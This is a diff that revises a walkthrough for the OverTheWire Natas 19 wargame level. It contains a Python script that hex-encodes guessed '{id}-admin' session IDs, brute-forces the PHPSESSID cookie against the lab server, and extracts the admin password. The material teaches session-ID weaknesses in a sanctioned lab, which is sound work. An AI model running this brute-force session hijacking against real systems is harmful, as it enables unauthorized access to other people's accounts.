@@ -4,13 +4,13 @@
 
 **URL: http://natas19.natas.labs.overthewire.org/**
 
-This level is very similar to the previous one (Natas 18), but the developer has attempted to obscure the Session IDs. Instead of simple integers (e.g., `123`), the `PHPSESSID` cookie now appears as a long alphanumeric string.
+This level is similar to Natas 18, except the `PHPSESSID` cookie is obscured instead of a plain integer (e.g., `123`).
 
 Upon logging in with a test username (e.g., `test`), we receive a session ID like: `3538322d74657374`
 
-If we decode this string from **Hexadecimal to ASCII**, we reveal the underlying structure: `3538322d74657374` → `582-test`
+Decoding this string from hexadecimal to ASCII reveals the structure: `3538322d74657374` → `582-test`
 
-**The Pattern:** The session ID format is simply `{Numerical_ID}-{username}` encoded in Hex.
+The session ID format is `{Numerical_ID}-{username}` encoded in hex.
 
 To bypass authentication, we must find a valid session ID where the username part is `admin`. This means we need to brute force the numerical ID, append `-admin`, hex-encode it, and send it to the server.
 
@@ -18,13 +18,13 @@ To bypass authentication, we must find a valid session ID where the username par
 
 ### Walkthrough
 
-1. **Analyze the Target:** We need to generate cookies that decode to: `1-admin`, `2-admin`, ... `640-admin`.
-2. **Encoding Logic:** If we want to try ID `280`:
+1. Generate `PHPSESSID` cookies that decode to `1-admin`, `2-admin`, ..., `640-admin`.
+2. For example, ID `280` encodes as:
    - String: `280-admin`
    - Hex Encoded: `3238302d61646d696e`
    - Cookie: `PHPSESSID=3238302d61646d696e`
 
-3. **Automation:** We will adapt our script from Level 18 to encode the payload before sending the request.
+3. Adapt the brute-force script to hex-encode each `{i}-admin` value before sending the request:
 
 ```
 import requests
@@ -36,28 +36,20 @@ headers = {"Content-Type": "application/x-www-form-urlencoded"}
 
 print("Brute forcing Hex-Encoded Session IDs...")
 
-# We assume the max ID is similar to the previous level (640)
+# Assume max ID matches Natas 18 (640).
 for i in range(1, 641):
-    # 1. Construct the raw session string
     raw_session = f"{i}-admin"
-
-    # 2. Encode it to Hex
-    # .encode() turns string to bytes, .hex() turns bytes to hex string
     encoded_session = raw_session.encode('utf-8').hex()
-
-    # 3. Set the cookie
     cookies = {"PHPSESSID": encoded_session}
 
     try:
         r = requests.post(target, auth=auth, cookies=cookies, timeout=5)
 
-        # 4. Check for success
         if "You are an admin" in r.text:
             print(f"\n[+] Admin session found!")
             print(f"    Raw ID: {raw_session}")
             print(f"    Cookie: {encoded_session}")
 
-            # Extract the password
             content_lines = r.text.splitlines()
             for line in content_lines:
                 if "Password:" in line:
@@ -73,7 +65,7 @@ for i in range(1, 641):
 print("Done.")
 ```
 
-4. Run the script. It works exactly like the previous level but handles the encoding layer.
+4. Run the script to find the admin session ID and password.
 
 ---
 
